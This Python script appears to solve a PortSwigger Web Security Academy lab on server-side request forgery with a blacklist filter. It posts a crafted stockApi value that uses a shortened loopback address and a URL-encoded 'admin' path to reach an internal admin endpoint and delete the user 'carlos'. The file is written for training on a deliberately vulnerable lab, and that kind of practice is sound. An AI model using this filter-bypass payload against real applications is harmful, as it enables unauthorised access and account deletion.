# https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter

import sys
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def delete_user(url):
    delete_payload="http://127.1/%61dmin/delete?username=carlos"
    stock_path="/product/stock"
    params= {'stockApi': delete_payload}
    response = requests.post(url + stock_path, data=params, verify=False, proxies=proxies )


def main():

    if len(sys.argv) != 2:

        print("You must enter an input !!!")
        print("Example: %s www.example.com "% sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print("Deleting user.............pelase wait")
    delete_user(url)

if __name__ == "__main__":
    main()
